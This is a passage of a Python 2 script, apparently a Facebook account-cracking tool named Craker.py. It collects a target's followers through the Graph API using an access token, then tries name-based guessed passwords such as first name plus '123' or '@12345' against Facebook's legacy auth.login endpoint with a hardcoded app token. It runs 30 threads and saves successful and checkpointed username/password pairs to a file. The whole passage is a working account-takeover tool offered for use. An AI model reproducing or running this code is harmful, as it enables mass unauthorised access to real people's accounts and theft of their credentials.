                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Done ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mcopy or copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;9mBack\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo14
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '              \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK FOLLOWERS \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / Friend doesnt exist !'
        raw_input('\n\x1b[1;95m[\x1b[1;97m<Keluar>\x1b[1;95m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Token CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode for 5 Seconds'
    print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '@123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '007'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '@12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Done ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mcopy or copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mBack\x1b[1;97m>}')
    os.system('python2 Craker.py')


def user_id():
    os.system('clear')
    print logo12
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mMasukan Username Akun Fb \x1b[1;92m: ')
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
    menu()


def perbarui():
    os.system('clear')
    print logo6
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80YayanXD\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan('\x1b[1;92mCurrently Updating Tools\x1b[1;93m...')
    jalan('\x1b[1;91m=10%')
    jalan('\x1b[1;93m==20%')
    jalan('\x1b[1;92m===30%')
    jalan('\x1b[1;94m====40%')
    jalan('\x1b[1;95m=====50%')
    jalan('\x1b[1;91m======60%')
    jalan('\x1b[1;92m=======70%')
    jalan('\x1b[1;93m========80%')
    jalan('\x1b[1;94m=========90%')
    jalan('\x1b[1;95m==========100%')
    jalan('\x1b[1;96mUpdate  Dome\x1b[1;93m')
    os.system('git pull origin master')
    raw_input('\n\x1b[1;94m{\x1b[1;97m<Back>\x1b[1;94m}')
    os.system('python2 Craker.py')


if __name__ == '__main__':
    menu()
    login()
    masuk()
